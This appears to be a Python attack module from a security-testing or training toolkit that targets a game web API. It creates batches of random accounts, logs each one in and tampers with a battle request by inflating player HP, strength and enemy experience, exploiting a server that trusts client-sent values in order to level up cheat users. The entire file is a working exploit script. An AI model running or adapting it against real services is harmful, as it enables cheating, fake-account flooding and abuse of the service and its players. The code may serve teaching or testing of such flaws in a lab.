#!/usr/bin/env python
# coding: UTF-8
import requests
import json
import sys
import hashlib
from os import urandom


class AtkGameCheatBattleLeveling(object):
    def __init__(self, utility, host="127.0.0.1", port="80", debug=False):
        self.utility = utility
        self.utility.target = host
        self.host = host
        self.port = port
        self.debug = debug
        self.description = "The module can be create cheat users if a bug of BattleAPI is not fix yet."
        self.target = host + ":" + port

    def __str__(self):
        return 'AtkGameCheatBattleLeveling object (target: %s, description: %s)' % (self.target, self.description)

    __repr__ = __str__


    def sendattack(self, num, exp=1000):

        #proxy
        #proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
        proxies = {"http": None,"https": None}

        #connect timeout, read timeout
        timeoutvalue= (5.0, 5.5)

        try:
            self.logger("Attack Start", "+")

            sessions = {}
            for i in range(num):
                sessions[i] = requests.Session()
                set_id = hashlib.sha256(urandom(10)).hexdigest()
                set_password = urandom(10).hex()
                nickname_token = hashlib.md5(urandom(10)).hexdigest()[:10]
                set_nickname = "Jutaro" + "_" + nickname_token

                json_data = { "user_name": set_id, "password": set_password, "nick_name": set_nickname}      
                headers = { "Content-Type": "application/json" }
                target_url = "http://" + self.target + "/create"
                response1 = sessions[i].post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

                print(f"userid{i}: {set_id}")
                print(f"password{i}: {set_password}")
                print(f"nick_name{i}: {set_nickname}")
                print("-----create user-----")
                print("Status code:   %i" % response1.status_code)
                print("Response body: %s" % response1.text)

                json_data = { "user_name": set_id, "password": set_password} 
                target_url = "http://" + self.target + "/login"
                response2 = sessions[i].post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

                print("-----login-----")
                print("Status code:   %i" % response2.status_code)
                print("Response body: %s" % response2.text)


                #=======================================================================
                # Set the Course normally and do a cheat on the BattleAPI.
                #=======================================================================
                json_data = { "id": 1 } 
                target_url = "http://" + self.target + "/coursepost"
                response3 = sessions[i].post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

                print("-----select course-----")
                print("Response body: %s" % response3.text)

                battle_info = json.loads(response3.text)
                battle_info['player']['hp'] = 99
                battle_info['player']['str'] = 99
                battle_info['enemy']['exp'] = exp
                target_url = "http://" + self.target + "/battle"
                response4 = sessions[i].post(target_url, data=json.dumps(battle_info), headers=headers, proxies=proxies, timeout=timeoutvalue)

                print("-----send cheat request-----")
                battle_info = json.loads(response4.text)
                if response4 != None and battle_info["status"]["result"] == "win":
                    self.logger("Attack SUCCESS!", "+")
                else:
                    self.logger("May be Attack failed?", "!")

                print('-'*8)
                
            self.logger("Attack Finished!", "+")

        except requests.exceptions.RequestException as e:
            self.logger("Error occurred", "!")
            file=sys.stderr
            print(e)
            #sys.exit(1)
        except Exception as e:
            print(e)

    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)


